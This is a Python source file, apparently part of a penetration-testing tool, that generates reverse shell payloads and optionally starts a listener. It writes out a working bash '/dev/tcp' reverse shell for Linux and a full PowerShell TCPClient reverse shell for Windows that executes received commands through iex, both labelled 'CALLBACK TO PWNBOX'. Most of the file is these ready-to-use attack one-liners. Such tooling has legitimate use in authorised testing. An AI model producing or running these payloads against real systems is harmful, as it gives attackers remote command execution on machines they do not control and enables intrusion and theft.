from helpers import whichIP, targetPasta
from random import randint
from services import startListener
from sys import exit

def create(shellType, os):
    if shellType == 'bind':
        print('[?] Target IP: ', end='')
        listenIP = input()
    else:
        listenIP = whichIP()
    print('[?] Listening Port [default=random]: ', end='')
    try:
        listenPort = input()
    except KeyboardInterrupt:
        exit(0)
    if listenPort == '' or listenPort == 'random':
        random_port = randint(1024, 49151)
        listenPort = str(random_port)
        print('[+] Using port ' + listenPort)

    # CHECK PAYLOAD OS
    if shellType == 'reverse':
        if os == 'linux':
            cmd = '# CALLBACK TO PWNBOX\n'
            cmd += f'bash -c \'bash -i >& /dev/tcp/{listenIP}/{listenPort} 0>&1\''
        elif os == 'windows':
            cmd = '# CALLBACK TO PWNBOX\n'
            cmd += f'powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'{listenIP}\',{listenPort});'
            cmd += '$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};'
            cmd += 'while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;'
            cmd += '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);'
            cmd += '$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + \'PS \' + (pwd).Path + \'> \';'
            cmd += '$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);'
            cmd += '$s.Flush()};$client.Close()\"'

        print('[?] Would you like to run a listener? [Y/n] ', end='')
        try:
            choice = input().lower()
        except KeyboardInterrupt:
            exit(0)
        if choice == '' or choice[0] == 'y':
            targetPasta(cmd)
            startListener(listenIP, listenPort)
        else:
            print('[-] No listener was started')

    elif shellType == 'bind':
        print('[!] Not yet implemented')
    elif shellType == 'web':
        print('[!] Not yet implemented')

